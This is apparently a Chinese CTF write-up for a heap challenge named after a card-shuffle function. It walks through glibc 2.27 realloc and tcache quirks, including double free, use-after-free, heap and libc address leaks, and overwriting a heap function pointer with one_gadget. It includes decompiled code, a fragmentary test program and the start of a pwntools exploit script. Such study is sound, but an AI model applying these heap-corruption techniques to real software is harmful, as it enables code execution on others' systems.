unsigned __int64 *__fastcall shuffle(struct cards *structs)
{
  struct list_content *ext1; // rax
  struct list_content *ext2; // rdx
  struct list_content *ext1_1; // rcx
  unsigned __int64 out_idx2; // rax
  unsigned __int64 in_idx2; // rdx
  struct list_content *v6; // rcx
  unsigned __int64 *random_lvl_ptr; // rax
  int i; // [rsp+1Ch] [rbp-24h]
  int idx1; // [rsp+20h] [rbp-20h]
  int idx2; // [rsp+24h] [rbp-1Ch]
  int ran1; // [rsp+28h] [rbp-18h]
  int ran2; // [rsp+2Ch] [rbp-14h]
  unsigned __int64 out_idx1; // [rsp+30h] [rbp-10h]
  unsigned __int64 in_idx1; // [rsp+38h] [rbp-8h]

  for ( i = 0; ; ++i )
  {
    random_lvl_ptr = structs->random_lvl_ptr;
    if ( i >= (__int64)random_lvl_ptr )
      break;
    idx1 = rand() % structs->count;
    idx2 = rand() % structs->count;
    ran1 = rand() % structs->range;
    ran2 = rand() % structs->range;
    ext1 = &structs->list_ptr->content[idx1][ran1];
    out_idx1 = ext1->out_idx;
    in_idx1 = ext1->in_idx;
    ext2 = &structs->list_ptr->content[idx2][ran2];
    ext1_1 = ext1;
    out_idx2 = ext2->out_idx;
    in_idx2 = ext2->in_idx;
    ext1_1->out_idx = out_idx2;
    ext1_1->in_idx = in_idx2;
    v6 = &structs->list_ptr->content[idx2][ran2];
    v6->out_idx = out_idx1;
    v6->in_idx = in_idx1;
  }
  return random_lvl_ptr;
}

整个程序没有 free，但是有 realloc。
glibc 版本 2.27.
堆上存在一个指针调用函数的位置，考虑可以用来改写为 one_gadget。

15mins 初步猜测

参考 REALLOC，发现 realloc 有很多特性。
假如设置 count = 0，释放 random_lvl 和 list_ptr，那么不会导致后面的 setinfo 赋值报错（i >= count 会退出循环），但是无法读取和 shuffle。
猜测是利用 init 的恢复操作，配合 realloc 释放堆和重新申请堆来制造申请 bss 或重叠堆的条件。

wp 复现

看了 wp 发现完全用不到 shuffle 这个函数，仅仅是迎合题目的名字来写的。（以后做题也要看看题目名字判断哪些函数是有用的，哪些函数是没用的。）

另外，2.27 的 3ubuntu1 似乎还没有添加对 tcache bins 的 double free 检测，但是 ubuntu 18 下的 2.27 3ubuntu1.6 是有检测的。这里是一个点。

wp 用了 doublefree 的特性来泄露堆地址。但也有可以不用 double free 泄露堆地址的方法。
注意到 init 函数中会申请 0x30（对齐后）的堆：

cards->list_ptr = (struct list *)malloc(0x20u);

而在 setinfo 中可以扩展或重新申请：

obj->list_ptr = (struct list *)realloc(obj->list_ptr, 8LL * obj->count);

由于最开始运行程序时，list 申请到的堆的下方有其他堆存在，realloc 不可能扩展，所以原有的 0x30 会被释放。
所以，计算一个申请到 0x30 堆的数字，0x28 / 4 = 10，设置 count = 10。

if ( (_UNKNOWN *)obj->ptr_record == &unk_202010 )
  random_lvl_ptr = (unsigned __int64 *)malloc(4 * obj->count);
else
  random_lvl_ptr = (unsigned __int64 *)realloc(obj->ptr_record, 4 * obj->count);

此时 randomlvlptr 会申请到一个 0x30 的堆，而这时候 10 * 8 = 80，原有的 list 堆 0x30 会被释放。
再设置 count 为 0 可以释放 randomlvlptr 的 0x30，从而在其 fd 位置写入指针，调用 getinfo 即可泄露。

printf("suit chara set:%s\n", (const char *)cards->ptr_record);

同理，申请大堆块释放进入 unsorted bins 就可以泄露 libc 基址（这里即使 unsorted bin 与 top chunk 合并，仍然能泄露，fd bk 位置的信息在合并之后不会被删除）。

难就难在如何制造 double free。
最简单的方法就是直接利用 3ubuntu1 glibc 的 tcache 无检查 doublefree 特性产生 doublefree。（这里是看了 wp 才知道的点）
但是想不到 glibc 本身没有检查。印象中的 2.27 一直都是有 tcache double free 检测的。而且在 docker ubuntu18 上面测试也有检测，不知道是哪里问题了。

wp 直接利用 2.27 tcache 的特性，即不检查 tcachebins 的数量（这点在 docker ubuntu18 上成功验证了，该版本 glibc 似乎不会检查 tcache 计数）。
不检查计数，就会导致只要 tcache_state 中的对应 bins 位置有指针内容（地址非 0），malloc 就会尝试分配。
通过以下程序验证：

// docker ubuntu18 下编译
// gcc -z lazy -z noexecstack -no-pie -fno-stack-protector -g -o ./test ./test.c

#include <stdlib.h>

{
	char * a = (char *)malloc(0x28);

	**(unsigned long long**)a = a + 0x60;

另外，还有一个特性是，对于已存放到 tcache 的指针，realloc 重新申请这个堆不会删除 tcache 中的记录，会导致 uaf。
例如 exp 中有这样一段：

init()
setinfo(128, 0, 0, b'a')# 210 410
setinfo(0, 0, 0)
# uaf: 动调发现 realloc 不会直接申请 tcache
# 通过 uaf 修改 tcache fd 内容
setinfo(128, 0, 0, flat(mng_mem))

这里为什么可以修改 tcache 的 fd 呢？动调可以得知为什么。
首先是第一句 setinfo(128, 0, 0, b'a')，会申请堆：

        ptr: 0x5591c56c9e00 ◂— 0x61 /* 'a' */
        size: 0

第三句 setinfo(128, 0, 0, flat(mng_mem)) 奇特的点来了。由于 ptr_record 存放了先前已经被 realloc free 掉了的指针，所以再调用 realloc 理论上来说会扩展 / 重新申请这个堆：

exp1：修改堆上指针为 one_gadget

#!/usr/bin/python3
from pwn import *

context(arch = 'amd64', log_level = 'debug')

ru = lambda x : p.recvuntil(x)
rl = lambda : p.recvline()
sa = lambda x, y : p.sendafter(x, y)
sla = lambda x, y : p.sendlineafter(x, y)
suheap = lambda x : success('heap base: ' + hex(x))
sulibc = lambda x : success('libc base: ' + hex(x))

def dbg():
    gdb.attach(p, gdbscript = gs)
    pause()

def menu(choice):
    sla(b'>> ', str(choice).encode())
def init():
    menu(1)
def setinfo(count, ranges, lvl, content = b''):
    menu(2)
    sla(b"suit count:", str(count).encode())
    sla(b"digit range 1 - ?", str(ranges).encode())
    sla(b"randomize level:", str(lvl).encode())
    if content != b'':
        sa(b"new suite set:", content)
def getinfo(og = False):
    menu(3)
    if not og:
        ru(b'chara set:')
def showcards():
    menu(5)
